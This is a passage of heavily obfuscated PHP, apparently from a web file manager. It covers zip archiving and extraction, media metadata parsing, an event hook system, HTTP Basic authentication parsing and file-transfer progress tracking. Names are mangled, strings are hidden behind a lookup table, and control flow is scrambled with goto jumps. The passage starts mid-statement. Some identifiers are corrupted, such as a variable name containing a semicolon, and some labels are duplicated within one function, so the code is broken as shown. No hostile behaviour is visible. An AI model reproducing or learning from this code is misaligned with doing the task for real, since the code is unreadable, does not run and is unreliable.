KodIO::KOD_SHARE_ITEM: $B϶ۈ = array($dՄ[985] => $dՄ[992], $dՄ[6] => $fˆ鳈); $C̗ = Model($dՄ[528])->getInfo($fˆ鳈[$dՄ[364]]); if ($C̗[$dՄ[366]] == $dՄ[464]) { $eܻ = KodIO::clear($C̗[$dՄ[990]] . $fˆ鳈[$dՄ[983]]); $fˆ鳈[$dՄ[435]] = $C̗; $fˆ鳈[$dՄ[969]] = $eܻ; $B϶ۈ = array($dՄ[985] => $dՄ[993], $dՄ[6] => $fˆ鳈); } break; default: $eܻ = $fˆ鳈[$dՄ[76]]; $B϶ۈ = array($dՄ[985] => $dՄ[994]); break; } $d秳 = $fˆ鳈[$dՄ[76]]; if (!isset(self::$driverCache[$d秳])) { $fԤ = $dՄ[72] . self::driverType($B϶ۈ[$dՄ[89]]); if (!class_exists($fԤ)) { show_json("{$fԤ}\40\x6e\x6f\164\x20\145\170\151\163\164\163\x21", !1); } $c߱ = isset($B϶ۈ[$dՄ[6]]) ? $B϶ۈ[$dՄ[6]] : !1; self::$driverCache[$d秳] = new $fԤ($c߱); } goto d; d: $a§Ψњ = self::$driverCache[$d秳]; $a§Ψњ->pathDriver = $c; $a§Ψњ->pathBase = $dՄ[33]; goto D; b݆Ԏ: $a§Ψњ->path = $eܻ; return $a§Ψњ; goto bӖ͸; bӖ͸: } private static function driverType($E) { $a𸼋 =& $_SERVER[놫Ӱ]; $E = strtolower($E); if ($E == $a𸼋[65]) { $E = $a𸼋[996]; } else { if (in_array($E, array($a𸼋[102], $a𸼋[58], $a𸼋[997]))) { $E = ucfirst($E); } else { $E = strtoupper($E); } } return $E; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $fݕϗ; if (!$fݕϗ) { $Dθկ = IO::init($_SERVER[놫Ӱ][8]); } return $Dθկ; } private static function iconvSystem($Aފǂ) { return self::local()->iconvSystem($Aފǂ); } private static function iconvApp($aڿ) { return self::local()->iconvApp($aڿ); } public static function zip($f, $a = "\172\151\x70", $E݊ = '', $d풖 = REPEAT_RENAME) { goto fȘ; C휮: $e؂ = !1; if (!$E݊ && $e->getType() == $Fз[102]) { $cӷŧ = self::zipFileList($f); } else { $e؂ = $E݊ ? $E݊ : TEMP_FILES . $Fз[998] . time() . rand_string(5) . $Fз[8]; mk_dir($e؂); $cӷŧ = self::zipFileList($f, $e؂); } $Bȴ = $eƎЩ[$Fз[28]]; goto e셓; fȘ: $Fз =& $_SERVER[놫Ӱ]; $e = self::init($f[0][$Fз[76]]); $eƎЩ = self::info($f[0][$Fз[76]]); goto C휮; b: $b = self::move($Dʧ, $Cю, $d풖); if (!$b) { del_dir($e؂); show_json(LNG($Fз[1000]), !1); } del_dir($e؂); goto d; d: return $b; goto e䒮ș; C: $Dʧ = $CψȮ . $Bȴ . $Fз[92] . $a; $Dʧ = get_filename_auto($Dʧ, $Fз[33], $d풖); $bŊѤɛ = self::iconvSystem($Dʧ); goto Fь; Fь: foreach ($cӷŧ as $b => $D) { $cӷŧ[$b] = self::iconvSystem($D); } KodArchive::create($bŊѤɛ, $cӷŧ); if (!IO::exist($Dʧ)) { if ($e؂) { del_dir($e؂); } show_json(LNG($Fз[1000]), !1); } goto a盘; a盘: if ($E݊ || !$e؂) { if ($e؂ && strstr($e؂, TEMP_FILES)) { $c = $cӷŧ = array(); recursion_dir($CψȮ, $c, $cӷŧ, 0); foreach ($c as $aҜ) { del_dir($aҜ); } foreach ($cӷŧ as $fχ) { if ($fχ == $bŊѤɛ) { continue; } del_file($fχ); } } return $Dʧ; } $Cю = self::pathFather($eƎЩ[$Fз[76]]); $Cю = $e->getPathOuter($e->iconvSystem($Cю)); goto b; e셓: if (count($cӷŧ) > 1) { $D = isset($eƎЩ[$Fз[462]]) ? $eƎЩ[$Fз[462]] : $eƎЩ[$Fз[76]]; $Bȴ = get_path_this(get_path_father($D)); } $CψȮ = $e؂; if (!$CψȮ) { $CψȮ = get_path_father($eƎЩ[$Fз[76]]); $fҖ = IO::info($CψȮ); if (!$fҖ[$Fз[186]]) { show_json(LNG($Fз[999]), !1); } } goto C; e䒮ș: } public static function unzip($C, $A = "\162\145\x70\154\x61\143\x65") { goto B; cˑä: self::archiveExt(); if (!$D[$C펎[1005]]) { show_json($C펎[1006] . $D[$C펎[1007]], !1); } Hook::trigger($C펎[1008], $D); goto Cٲ; Cٲ: recursion_dir($D, $C, $Fߠƅ, 0); $Dɤ = array_merge($C, $Fߠƅ); foreach ($Dɤ as $Eۅ) { $Eۅ = self::iconvApp($Eۅ); self::move($Eۅ, $cҗ, $A); } goto Cڎ; c̶: $c = self::tmpFileName($a˔); $D = TEMP_FILES . $c; del_dir($D); goto a͏; E˛: $d㖿 = self::iconvSystem($d㖿); $aĢ = isset($C[$C펎[1003]]) ? $C[$C펎[1003]] : $C펎[1004]; $D = KodArchive::extract($d㖿, $D . $C펎[8], $aĢ); goto cˑä; B: $C펎 =& $_SERVER[놫Ӱ]; $BЈ = $C[$C펎[76]]; $cҗ = $C[$C펎[1001]]; goto D؎; D؎: if (!($a˔ = parent::info($BЈ))) { show_json(LNG($C펎[1002]), !1); } if (!($E♆ę = parent::infoFull($cҗ))) { $cҗ = parent::mkdir($cҗ); $E♆ę = array($C펎[76] => $cҗ); } else { if (isset($E♆ę[$C펎[366]]) && trim($E♆ę[$C펎[76]], $C펎[8]) != trim($cҗ, $C펎[8])) { $Cܝܤ = KodIO::make($E♆ę[$C펎[457]]); $d = parent::fileNameAuto($Cܝܤ, $E♆ę[$C펎[28]], REPEAT_RENAME_FOLDER, !0); $cҗ = parent::mkdir($Cܝܤ . $d); $E♆ę = array($C펎[76] => $cҗ); } } $cҗ = $E♆ę[$C펎[76]]; goto c̶; a͏: mk_dir($D); $d㖿 = $D . $C펎[92] . $a˔[$C펎[157]]; if (!@file_exists(self::iconvSystem($d㖿))) { $FА = self::localFilePath($BЈ, $a˔[$C펎[157]]); $d㖿 = $FА ? $FА : parent::download($BЈ, $d㖿); } goto E˛; Cڎ: del_dir($D); if (!$FА) { del_file($d㖿); } return !0; goto A; A: } public function unzipList($eم) { goto Eǖ; E: $B󝽠 = 50000; if (request_url_safe($Cĥ)) { $BĈŅ = parse_url_query($Cĥ); if (!isset($BĈŅ[$e鲥[76]])) { show_json($e鲥[1010], !1); } } $cС藺 = isset($BĈŅ) ? $BĈŅ[$e鲥[76]] : $Cĥ; goto cР; cΥ: $aА = $bՑ͈ . $e鲥[8] . $dҼڏ; if (!@file_exists(self::iconvSystem($aА))) { if (isset($BĈŅ)) { url_request($Cĥ, $e鲥[1012], $aА); } else { $dƐƹ = self::localFilePath($Cĥ, $EԾ[$e鲥[157]]); $aА = $dƐƹ ? $dƐƹ : self::download($Cĥ, $aА); } } $aА = self::iconvSystem($aА); goto D̚Ć; Eǖ: $e鲥 =& $_SERVER[놫Ӱ]; $Cĥ = $eم[$e鲥[76]]; $D֞ = isset($eم[$e鲥[1009]]) ? $eم[$e鲥[1009]] : -1; goto E; c: del_dir($bՑ͈); if (!$a[$e鲥[1005]]) { show_json($a[$e鲥[1007]], !1); } $fЖ = json_encode($a[$e鲥[1007]]); goto e; D̚Ć: if ($D֞ >= 0) { $aϊ = isset($eم[$e鲥[1013]]) ? $eم[$e鲥[1013]] : !1; $d = isset($eم[$e鲥[28]]) ? $eم[$e鲥[28]] : $e鲥[33]; KodArchive::filePreview($aА, $D֞, $aϊ, $d); self::archiveExt(); die; } $a = KodArchive::listContent($aА); self::archiveExt(); goto c; cР: $EԾ = self::info($cС藺); $C޽뜃 = self::tmpFileName($EԾ); if (isset($BĈŅ)) { $a = array($BĈŅ[$e鲥[76]], $BĈŅ[$e鲥[1009]], $BĈŅ[$e鲥[28]]); $dҼڏ = md5(implode($e鲥[71], $a)) . $e鲥[92] . get_path_ext($BĈŅ[$e鲥[28]]); } else { $a = array($EԾ[$e鲥[28]], $EԾ[$e鲥[76]], $EԾ[$e鲥[78]]); $dҼڏ = md5(implode($e鲥[71], $a)) . $e鲥[92] . $EԾ[$e鲥[157]]; } goto c; c: if ($D֞ == -1) { $Aė;Ǫ = IO_PATH_SYSTEM_TEMP . "\x7a\151\160\126\x69\x65\x77\57{$C޽뜃}\57{$dҼڏ}\56\x6c\157\147"; $Bބш = self::infoFull($Aė;Ǫ); if ($Bބш) { $Aė;Ǫ = $Bބш[$e鲥[76]]; $F颏븠 = self::getContent($Aė;Ǫ); if ($F颏븠) { $fЖ = json_decode($F颏븠, !0); if (count($fЖ) >= $B󝽠) { show_json(sprintf(LNG($e鲥[1011]), count($fЖ)), !1); } return $fЖ; } } else { $Aė;Ǫ = self::mkfile($Aė;Ǫ); } } $bՑ͈ = TEMP_FILES . $C޽뜃; if (!is_dir($bՑ͈)) { mk_dir($bՑ͈); } goto cΥ; e: self::setContent($Aė;Ǫ, $fЖ); if (count($a[$e鲥[1007]]) >= $B󝽠) { show_json(sprintf(LNG($e鲥[1011]), count($a[$e鲥[1007]])), !1); } return $a[$e鲥[1007]]; goto c­; c­: } private function zipFileList($c, $B펴 = false) { $F =& $_SERVER[놫Ӱ]; $c見ɪ = array(); foreach ($c as $Bؒ) { $a = $Bؒ[$F[76]]; if ($B펴) { $a = self::copy($Bؒ[$F[76]], $B펴, $F[739]); } if ($a && self::local()->exist($a)) { $c見ɪ[$Bؒ[$F[76]]] = $a; } } if (!empty($c見ɪ)) { return array_values($c見ɪ); } show_json(LNG($F[1014]), !1); } public static function tmpFileName($B٨) { $e =& $_SERVER[놫Ӱ]; $aޒ᝞ = array($B٨[$e[28]], $B٨[$e[76]], $B٨[$e[78]], $B٨[$e[455]]); return md5(implode($e[71], $aޒ᝞)); } private function localFilePath($A˄, $bե) { goto d; d: $eө =& $_SERVER[놫Ӱ]; $F󅫞 = KodIO::parse($A˄); if ($F󅫞[$eө[29]] == KodIO::KOD_SOURCE) { $D = Model($eө[747])->fileInfoGet(KodIO::sourceID($A˄)); if (!$D[$eө[76]]) { show_json($eө[1015], !1); } $A˄ = $D[$eө[76]]; } goto B՚ժ; Dַ: if ($e橘 != $eө[102] || $bե == $eө[1017] && $c򲤭) { return !1; } if (!$eɦ¯->exist($eɦ¯->path)) { show_json(LNG($eө[101]), !1); } self::archiveExt($bե); goto Bފ; B՚ժ: $eɦ¯ = self::init($A˄); $e橘 = $eɦ¯->getType(); $c򲤭 = strtoupper(substr(PHP_OS, 0, 3)) == $eө[1016]; goto Dַ; Bފ: return $eɦ¯->path; goto D꫃; D꫃: } private function archiveExt($Eَߪ = '') { $GLOBALS[$_SERVER[놫Ӱ][1018]] = $Eَߪ; } } goto Cߔۊ; E: class GetInfo { private static $fileTypeArray; public static function get($bҎ) { $BӔ = IO::info($bҎ); return self::infoAdd($BӔ); } public static function infoAdd(&$fʊ) { goto AΥ; fʣ: $Fט[$Eʉ[369]] = $B铎; $fʊ[$Eʉ[422]] = $Fט; return $fʊ; goto A☫; AΥ: $Eʉ =& $_SERVER[놫Ӱ]; static $Eթ; if (!$Eթ) { require SDK_DIR . $Eʉ[1508]; $Eթ = new getID3(); } goto e; A: $B铎 = $fʊ[$Eʉ[157]]; try { if ($fʊ[$Eʉ[157]] == $Eʉ[1510]) { $Fט = self::psdParse($FҒ); $B铎 = $Eʉ[1511]; } else { if ($fʊ[$Eʉ[157]] == $Eʉ[1512]) { $Fט = self::pdfParse($FҒ); } else { $B铎 = self::$fileTypeArray[$Eʉ[1513]][$fʊ[$Eʉ[157]]]; $f͌ = self::$fileTypeArray[$Eʉ[1514]][$B铎][$Eʉ[1515]]; $ać = @$Eթ->analyze($FҒ, $fʊ[$Eʉ[78]], $fʊ[$Eʉ[28]]); $Fט = self::parseData($ać, $f͌, $fʊ); } } } catch (Exception $dؿ) { $Fט = array($Eʉ[369] => $B铎); } if (!$Fט) { return; } goto fʣ; e: if (!$fʊ || $fʊ[$Eʉ[29]] != $Eʉ[164]) { return; } if (!self::support($fʊ[$Eʉ[157]]) || isset($fʊ[$Eʉ[422]])) { return; } $FҒ = $Eʉ[1509] . $fʊ[$Eʉ[76]]; goto A; A☫: } public static function support($CȤ) { goto ẺΞ; ẺΞ: $bÎ =& $_SERVER[놫Ӱ]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $CȤ = strtolower($CȤ); goto eǬӎ; Bچ: return !1; goto eϰ; eǬӎ: $Dȕ = array($bÎ[1512], $bÎ[1510]); if (in_array($CȤ, $Dȕ)) { return !0; } if (isset(self::$fileTypeArray[$bÎ[1513]][$CȤ])) { return !0; } goto Bچ; eϰ: } private static function parseData($Dҕޣ, $aӫǺ, $aǦ) { $dՑ =& $_SERVER[놫Ӱ]; $F = $Dҕޣ[$dՑ[1516]]; $CϽ = array(); foreach ($aӫǺ as $E => $Aʶ) { foreach ($Aʶ as $eЈ) { if (is_array($eЈ)) { $F = self::parseData($Dҕޣ, $Aʶ, $aǦ); if ($F) { $CϽ[$E] = $F; } break; } $cѷՉ = str_replace($dՑ[1294], $F, $eЈ); $F = _get($Dҕޣ, $cѷՉ); $F = is_array($F) ? $F[0] : $F; if ($F) { break; } } if ($F || $F === 0 || $F === !1) { $F = self::valueReset($eЈ, $F, $E); if ($F !== null) { $CϽ[$E] = $F; } } } $CϽ = self::valueResetAll($CϽ, $aǦ); return $CϽ; } private static function psdParse($Bź) { $fˮ =& $_SERVER[놫Ӱ]; if (IO::fileSubstr($Bź, 0, 4) != $fˮ[1517]) { return !1; } $d = getImageSize($Bź, $Aܙ); if (!$d) { return; } $c = array($fˮ[1433] => $d[0], $fˮ[1435] => $d[1]); return $c; } private static function pdfParse($BΑ) { return FileParsePdf::parse($BΑ); } private static function fileTypeParse() { $bԡ =& $_SERVER[놫Ӱ]; $B = self::fileTypeArray(); $c񜉥߉ = array(); foreach ($B as $B̴ => $F) { $b = _get($F, $bԡ[157], $bԡ[33]); $dˋ = is_string($b) ? explode($bԡ[47], $b) : $b; if (!$dˋ) { continue; } foreach ($dˋ as $b) { $b = strtolower(trim($b)); if (!$b) { continue; } $c񜉥߉[$b] = $B̴; } $B[$B̴][$bԡ[157]] = array_keys($c񜉥߉); $B[$B̴][$bԡ[1515]] = self::parseKeyMap($F[$bԡ[1515]]); } return array($bԡ[1514] => $B, $bԡ[1513] => $c񜉥߉); } private static function parseKeyMap($c) { $eʊ =& $_SERVER[놫Ӱ]; foreach ($c as $C˰ => $bţ) { if (is_array($bţ)) { $FȦ = self::parseKeyMap($bţ); if ($FȦ) { $c[$C˰] = $FȦ; } continue; } $Aϑ = explode($eʊ[47], $bţ); $b = array(); foreach ($Aϑ as $Eל) { $Eל = trim($Eל); if (!$Eל) { continue; } if (preg_match($eʊ[1518], $Eל, $a)) { $c޴ = explode($eʊ[268], $a[1]); foreach ($c޴ as $D鼪) { $b[] = str_replace($a[0], $D鼪, $Eל); } } else { $b[] = $Eל; } } $c[$C˰] = $b; } return $c; } private static function valueResetAll($c, $D̴Ĭ) { goto cۨ; c: return $c; goto a; c: if ($BŒׂ) { $Aт = IO_PATH_SYSTEM_TEMP . $cФޗ[1524] . KodIO::hashPath($D̴Ĭ) . $cФޗ[1525]; $c[$cФޗ[1526]] = Action($cФޗ[1527])->pluginCacheFileSet($Aт, $BŒׂ); unset($c[$cФޗ[1528]][$cФޗ[1511]]); } $e珅Ա = _get($c, $cФޗ[1529], $cФޗ[33]); $Eύ = _get($c, $cФޗ[1530], $cФޗ[33]); goto d; d: $e = _get($c, $cФޗ[1531], $cФޗ[33]); $D = $e珅Ա . $Eύ . $e; if ($D && get_charset($D) != $cФޗ[323]) { $c[$cФޗ[1528]][$cФޗ[1237]] = iconv_to($c[$cФޗ[1528]][$cФޗ[1237]], get_charset($D), $cФޗ[323]); $c[$cФޗ[1528]][$cФޗ[1532]] = iconv_to($c[$cФޗ[1528]][$cФޗ[1532]], get_charset($D), $cФޗ[323]); $c[$cФޗ[1528]][$cФޗ[1533]] = iconv_to($c[$cФޗ[1528]][$cФޗ[1533]], get_charset($D), $cФޗ[323]); } goto c; cۨ: $cФޗ =& $_SERVER[놫Ӱ]; if (isset($c[$cФޗ[1519]])) { $aهޢ = ceil($c[$cФޗ[1519]]); $CĊ = intval($aهޢ / 3600); $Bۊ = intval(($aهޢ - $CĊ * 3600) / 60); $Fي = $aهޢ % 60; $c[$cФޗ[1520]] = sprintf($cФޗ[1521], $CĊ, $Bۊ, $Fي); if ($CĊ == 0) { $c[$cФޗ[1520]] = sprintf($cФޗ[1522], $Bۊ, $Fي); } } $BŒׂ = _get($c, $cФޗ[1523]); goto c; a: } private static function valueReset($C̺, $Dœ, $C۹ݠ) { $D =& $_SERVER[놫Ӱ]; $b똮 = $D[1450]; switch ($C̺) { case $D[1534]: $Dœ = $Dœ == $D[493] ? $D[1535] : $D[1536]; break; case $D[1537]: $Dœ = $Dœ ? $Dœ : null; break; default: break; } switch ($C۹ݠ) { case $D[1538]: $Dœ = round($Dœ, 2); break; case $D[184]: case $D[106]: if ($Dœ < 0) { $Dœ = null; } else { if (is_numeric($Dœ)) { $Dœ = date($b똮, $Dœ); } } break; default: break; } return $Dœ; } private static function fileTypeArray() { $d =& $_SERVER[놫Ӱ]; return array($d[1511] => array($d[157] => $d[1539] . $d[1540], $d[1515] => array($d[1433] => $d[1541], $d[1435] => $d[1542], $d[1543] => $d[1544], $d[1545] => $d[1546], $d[184] => $d[1547], $d[106] => $d[1548], $d[1549] => $d[1550], $d[1551] => $d[1552], $d[1553] => $d[1554], $d[1555] => $d[1556], $d[1557] => $d[1558], $d[1559] => $d[1560], $d[1561] => $d[1562], $d[1563] => array($d[1564] => $d[1565], $d[1566] => $d[1567], $d[1568] => $d[1569]), $d[1570] => $d[1571], $d[1572] => $d[1573], $d[1574] => $d[1575], $d[1576] => $d[1577], $d[1578] => array($d[1579] => $d[1580], $d[1581] => $d[1582], $d[1583] => $d[1584], $d[1585] => $d[1586], $d[1587] => $d[1588], $d[1589] => $d[1590], $d[1591] => $d[1592], $d[1593] => $d[1594], $d[1595] => $d[1596], $d[1597] => $d[1598], $d[1599] => $d[1600]))), $d[1601] => array($d[157] => $d[1602] . $d[1603], $d[1515] => array($d[1519] => $d[1604], $d[184] => $d[1605], $d[106] => $d[1606], $d[1551] => $d[1607], $d[1608] => $d[1609], $d[1610] => $d[1537], $d[1611] => $d[1612], $d[1613] => $d[1614], $d[1615] => $d[1616], $d[1528] => array($d[1237] => $d[1617], $d[1532] => $d[1618], $d[1533] => $d[1619], $d[1620] => $d[1621], $d[1622] => $d[1623], $d[1624] => $d[1625], $d[1511] => $d[1626]))), $d[1627] => array($d[157] => $d[1628] . $d[1629], $d[1515] => array($d[1433] => $d[1630], $d[1435] => $d[1631], $d[1519] => $d[1604], $d[184] => $d[1632], $d[106] => $d[1633], $d[1538] => $d[1634], $d[1615] => $d[1635], $d[1611] => $d[1636], $d[1551] => $d[1637], $d[1601] => array($d[1610] => $d[1537], $d[1638] => $d[1639], $d[1608] => $d[1609], $d[1615] => $d[1616], $d[1611] => $d[1640], $d[1613] => $d[1614]))), $d[1641] => array($d[1515] => array($d[1642] => $d[1643], $d[1644] => $d[1645])), $d[1646] => array($d[1515] => array())); } } class Hook { private static $events = array(); public static function get($d = false) { if (!$d) { return self::$events; } else { return self::$events[$d]; } } public static function apply($dË, $Fü = array()) { $Dǻ˒ = ActionApply($dË, $Fü); if (is_string($dË)) { Hook::trigger($dË); } return $Dǻ˒; } public static function bind($F¯, $Fۘ, $E򇉂 = false) { $a຿ =& $_SERVER[놫Ӱ]; if (!isset(self::$events[$F¯])) { self::$events[$F¯] = array(); } self::$events[$F¯][] = array($a຿[1647] => $Fۘ, $a຿[1648] => $E򇉂, $a຿[1649] => 0); } public static function once($Fꛈ, $Dű) { self::bind($Fꛈ, $Dű, !0); } public static function unbind($fō, $cڢÇ = false) { if (!$cڢÇ) { self::$events[$fō] = array(); return; } $cިǛ = self::$events[$fō]; self::$events[$fō] = array(); for ($D = 0; $D < count($cިǛ); $D++) { if ($cިǛ[$D][$_SERVER[놫Ӱ][1647]] == $cڢÇ) { continue; } self::$events[$fō][] = $cިǛ[$D]; } } public static function filter($eੌ, $D) { goto e; e: $FȽ =& $_SERVER[놫Ӱ]; $eüÎ = self::$events; if (!isset($eüÎ[$eੌ])) { return $D; } goto Eގޑߛ; Eގޑߛ: $Bɕ = $eüÎ[$eੌ]; $bϨ = $D; if (!is_array($Bɕ) || count($Bɕ) == 0) { return $bϨ; } goto bԕ; bԕ: for ($dɇޯ = 0; $dɇޯ < count($Bɕ); $dɇޯ++) { $E = $Bɕ[$dɇޯ]; if ($E[$FȽ[1648]] && $E[$FȽ[1649]] > 1) { continue; } self::$events[$eੌ][$dɇޯ][$FȽ[1649]] = $E[$FȽ[1649]] + 1; $a۳ = self::apply($E[$FȽ[1647]], array($bϨ)); if (!is_null($a۳)) { $bϨ = $a۳; } } return $bϨ; goto C; C: } public static function trigger($e۴ڂ) { goto f륷; c枺ɯ: return $C䲳; goto eܠ; a: $D = func_get_args(); array_shift($D); for ($c򃎡 = 0; $c򃎡 < count($eΙǌ); $c򃎡++) { $a̼ = $eΙǌ[$c򃎡]; if ($a̼[$Eվ[1648]] && $a̼[$Eվ[1649]] > 1) { continue; } if (defined($Eվ[1650]) && GLOBAL_LOG_HOOK) { write_log($e۴ڂ . $Eվ[1651] . $a̼[$Eվ[1647]], $Eվ[1652]); } self::$events[$e۴ڂ][$c򃎡][$Eվ[1649]] = $a̼[$Eվ[1649]] + 1; $Aقϙ = self::apply($a̼[$Eվ[1647]], $D); if (defined($Eվ[1650]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $Eվ[1652]); if ($a̼[$Eվ[1649]] == 200) { $Dڃ = is_array($a̼[$Eվ[1647]]) ? json_encode_force($a̼[$Eվ[1647]]) : $a̼[$Eվ[1647]]; write_log($Eվ[1653] . $e۴ڂ . $Eվ[1654] . $Dڃ, $Eվ[1655]); } } $C䲳 = is_null($Aقϙ) ? $C䲳 : $Aقϙ; } goto c枺ɯ; C͕Ĥ: if (!isset($D䑍[$e۴ڂ])) { return $C䲳; } $eΙǌ = $D䑍[$e۴ڂ]; if (!is_array($eΙǌ) || count($eΙǌ) == 0) { return $C䲳; } goto a; f륷: $Eվ =& $_SERVER[놫Ӱ]; $D䑍 = self::$events; $C䲳 = !1; goto C͕Ĥ; eܠ: } } class HttpAuth { public static function get() { $A흫޷ =& $_SERVER[놫Ӱ]; $Eҍ = $A흫޷[33]; $EѺ = $A흫޷[33]; if (isset($_SERVER[$A흫޷[1656]])) { $Eҍ = $_SERVER[$A흫޷[1656]]; $EѺ = $_SERVER[$A흫޷[1657]]; } elseif (isset($_SERVER[$A흫޷[1658]])) { $A߯ = $_SERVER[$A흫޷[1658]]; if (strpos(strtolower($A߯), $A흫޷[1659]) === 0) { $e৖ = explode($A흫޷[4], base64_decode(substr($A߯, 6))); $Eҍ = isset($e৖[0]) ? $e৖[0] : $A흫޷[33]; $EѺ = isset($e৖[1]) ? $e৖[1] : 0; } } return array($A흫޷[527] => $Eҍ, $A흫޷[890] => $EѺ); } public static function error() { goto dǢ; dǢ: $Fٙȳ =& $_SERVER[놫Ӱ]; header($Fٙȳ[1660]); header($Fٙȳ[1661]); goto a܇; a܇: header($Fٙȳ[1662]); header($Fٙȳ[1663]); header($Fٙȳ[1664]); goto A婟׻; A婟׻: die; goto aԃ; aԃ: } public static function make($B誆, $E풌) { $A =& $_SERVER[놫Ӱ]; return $A[1665] + base64_encode($B誆 . $A[4] . $E풌); } } goto c; C̤: class TaskFileTransfer extends Task { protected function startAfter() { goto aؔ; BƲ޸: $C[$FЪ[1283]] = $FЪ[33]; $C[$FЪ[1386]] = $FЪ[33]; $C[$FЪ[1387]] = 0; goto b䂳; f׽Ĵ: Hook::bind($FЪ[1363], array($this, $FЪ[1364])); Hook::bind($FЪ[1365], array($this, $FЪ[1366])); Hook::bind($FЪ[1367], array($this, $FЪ[1368])); goto d埛; bȉݐ: Hook::bind($FЪ[535], array($this, $FЪ[1371])); Hook::bind($FЪ[502], array($this, $FЪ[1372])); Hook::bind($FЪ[499], array($this, $FЪ[1372])); goto d渒; b䂳: if (!$C[$FЪ[1237]]) { $C[$FЪ[1237]] = LNG($FЪ[1388]); } goto c; e: $C[$FЪ[1382]] = LNG($FЪ[1383]); $C[$FЪ[1384]] = 0; $C[$FЪ[1385]] = 0; goto BƲ޸; aؔ: $FЪ =& $_SERVER[놫Ӱ]; $C =& $this->task; $this->sourceCopyFolder = !1; goto f׽Ĵ; d埛: Hook::bind($FЪ[531], array($this, $FЪ[1369])); Hook::bind($FЪ[532], array($this, $FЪ[1370])); Hook::bind($FЪ[534], array($this, $FЪ[1371])); goto bȉݐ; eވ: Hook::bind($FЪ[1373], array($this, $FЪ[1374])); Hook::bind($FЪ[524], array($this, $FЪ[1375])); $this->sourceModelCopyFlag = !1; goto eΑŉ; eΑŉ: Hook::bind($FЪ[1376], array($this, $FЪ[1377])); Hook::bind($FЪ[1378], array($this, $FЪ[1379])); Hook::bind($FЪ[1380], array($this, $FЪ[1381])); goto e; d渒: Hook::bind($FЪ[504], array($this, $FЪ[1372])); Hook::bind($FЪ[506], array($this, $FЪ[1372])); Hook::bind($FЪ[508], array($this, $FЪ[1372])); goto eވ; c: } protected function endAfter() { goto cϓᅣ; E凔: Hook::unbind($bء[499], array($this, $bء[1372])); Hook::unbind($bء[504], array($this, $bء[1372])); Hook::unbind($bء[506], array($this, $bء[1372])); goto aɏ; cϓᅣ: $bء =& $_SERVER[놫Ӱ]; Hook::unbind($bء[1363], array($this, $bء[1364])); Hook::unbind($bء[1365], array($this, $bء[1366])); goto F; e: Hook::unbind($bء[534], array($this, $bء[1371])); Hook::unbind($bء[535], array($this, $bء[1371])); Hook::unbind($bء[502], array($this, $bء[1372])); goto E凔; E: Hook::unbind($bء[1376], array($this, $bء[1377])); Hook::unbind($bء[1378], array($this, $bء[1379])); Hook::unbind($bء[1380], array($this, $bء[1381])); goto EԴ; aɏ: Hook::unbind($bء[508], array($this, $bء[1372])); Hook::unbind($bء[1373], array($this, $bء[1374])); Hook::unbind($bء[524], array($this, $bء[1375])); goto E; F: Hook::unbind($bء[1367], array($this, $bء[1368])); Hook::unbind($bء[531], array($this, $bء[1369])); Hook::unbind($bء[532], array($this, $bء[1370])); goto e; EԴ: } public function copyMoveStart($a, $b, $F, $E) { } public function updateAfter() { goto F҉ד; Cڛ: if ($this->sourceModelCopyFlag) { return; } $B⨂Ҥ = 0; if ($dԴ[$dꫫ[1386]] == $dꫫ[1013]) { $B⨂Ҥ = $dԴ[$dꫫ[1385]] * 0.5; } else { if ($dԴ[$dꫫ[1386]] == $dꫫ[90]) { $B⨂Ҥ = $dԴ[$dꫫ[1385]] * 0.5 + $dԴ[$dꫫ[1384]] * 0.5; } } goto a뚤; a뚤: $dԴ[$dꫫ[1340]] = ($dԴ[$dꫫ[1389]] + $B⨂Ҥ) / $dԴ[$dꫫ[683]]; if ($dԴ[$dꫫ[1340]] > 0) { $dΚ = timeFloat() - $dԴ[$dꫫ[1342]] - $dԴ[$dꫫ[1345]]; $dԴ[$dꫫ[1346]] = $dΚ * (1 - $dԴ[$dꫫ[1340]]) / $dԴ[$dꫫ[1340]]; } goto b; F҉ד: $dꫫ =& $_SERVER[놫Ӱ]; $dԴ =& $this->task; if (!$dԴ[$dꫫ[683]]) { return; } goto Cڛ; b: } public function addPath($aג) { goto Eٕϐ; Eٕϐ: $Aܬ =& $_SERVER[놫Ӱ]; $aɈ =& $this->task; $e = IO::infoWithChildren($aג); goto D␻ݒ; FҼ: $aɈ[$Aܬ[683]] += $e[$Aܬ[78]]; $this->update(); goto D; D␻ݒ: $f = $aɈ[$Aܬ[1390]] ? $aɈ[$Aܬ[1390]][$Aܬ[1391]] : 0; $aɈ[$Aܬ[1390]] = array($Aܬ[1391] => $f + 1, $Aܬ[383] => $e[$Aܬ[28]], $Aܬ[76] => $e[$Aܬ[76]], $Aܬ[462] => $e[$Aܬ[462]] ? $e[$Aܬ[462]] : $e[$Aܬ[76]]); if ($e[$Aܬ[29]] == $Aܬ[164]) { $aɈ[$Aܬ[1281]] += 1; } else { $aɈ[$Aܬ[1281]] += $e[$Aܬ[81]][$Aܬ[79]]; if ($e[$Aܬ[366]]) { $aɈ[$Aܬ[1281]] += $e[$Aܬ[81]][$Aܬ[80]] + 1; } } goto FҼ; D: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($cǗ) { $D¯ڭ =& $_SERVER[놫Ӱ]; $f⍹ւ =& $this->task; $f⍹ւ[$D¯ڭ[1382]] = $cǗ[$D¯ڭ[28]]; $f⍹ւ[$D¯ڭ[1283]] = $cǗ[$D¯ڭ[28]]; $this->update(); } public function copyFileStart($ḃ, $c붤, $C֎͑, $c߳, $Bㇸߢ, $c) { goto c; a꼻: $D̻[$fб[1382]] = $bÇܔ; $D̻[$fб[1384]] = (int) $ḃ->size($c붤); $D̻[$fб[1385]] = 0; goto C텹ٞ; E̕: $GLOBALS[$fб[1393]] = $Bㇸߢ; $GLOBALS[$fб[1392]] = $c; $D̻ =& $this->task; goto a꼻; c: $fб =& $_SERVER[놫Ӱ]; $bÇܔ = $Bㇸߢ; if ($bÇܔ == $GLOBALS[$fб[1392]]) { $bÇܔ = $GLOBALS[$fб[1393]]; } goto E̕; f: $this->update(); goto Aꏤ; C텹ٞ: $D̻[$fб[1283]] = $fб[33]; $D̻[$fб[1386]] = $fб[33]; $D̻[$fб[1387]] = 0; goto f; Aꏤ: } public function copyFileEnd($Bᆌ, $CҤ, $E竢, $f߸î, $Eۚ, $Dƕ) { $C =& $_SERVER[놫Ӱ]; 